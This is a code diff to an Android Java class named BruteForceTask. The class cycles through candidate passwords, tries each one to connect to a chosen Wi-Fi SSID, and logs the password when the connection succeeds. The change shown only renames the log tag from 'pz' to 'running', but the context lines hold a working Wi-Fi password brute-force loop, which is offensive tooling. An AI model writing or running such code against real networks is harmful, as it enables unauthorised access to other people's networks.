@@ -41,11 +41,11 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
 //        for (int i = 0; i < test.length; i++) {
 //            testPass = test[i];
 //            Utils.finallyConnect(testPass, strings[0], activity);
-//            Log.d("pz", testPass);
+//            Log.d("running", testPass);
 //            publishProgress(i);
 //
 //            if (isCancelled()) {
-//                Log.d("pz", "isCancelled");
+//                Log.d("running", "isCancelled");
 //                break;
 //            }
 //            try {
@@ -58,8 +58,8 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
 //            WifiInfo wifiInfo = wifi.getConnectionInfo();
 //            if (Utils.isConnectAccessPoint(activity.getApplicationContext())
 //                    && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
-//                Log.d("pz", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + testPass);
-//                Log.d("pz", "pass is: " + testPass);
+//                Log.d("running", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + testPass);
+//                Log.d("running", "pass is: " + testPass);
 //                foundPass = testPass;
 //                break;
 //            }
@@ -73,9 +73,9 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
             count+=1;
 
             Utils.finallyConnect(bruteforce.getPass(), strings[0], activity);
-            Log.d("pz", bruteforce.getPass());
+            Log.d("running", bruteforce.getPass());
             if (isCancelled()) {
-                Log.d("pz", "isCancelled");
+                Log.d("running", "isCancelled");
                 break;
             }
             try {
@@ -87,8 +87,8 @@ public class BruteForceTask extends AsyncTask<String, Integer, Integer> {
             WifiInfo wifiInfo = wifi.getConnectionInfo();
             if (Utils.isConnectAccessPoint(activity.getApplicationContext())
                     && Utils.convertSSID(wifiInfo.getSSID()).equals(strings[0])) {
-                Log.d("pz", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + bruteforce.getPass());
-                Log.d("pz", "pass is: " + bruteforce.getPass());
+                Log.d("running", Utils.convertSSID(wifiInfo.getSSID()) + "/" + strings[0] + " /pass: " + bruteforce.getPass());
+                Log.d("running", "pass is: " + bruteforce.getPass());
                 foundPass = bruteforce.getPass();
                 break;
             }
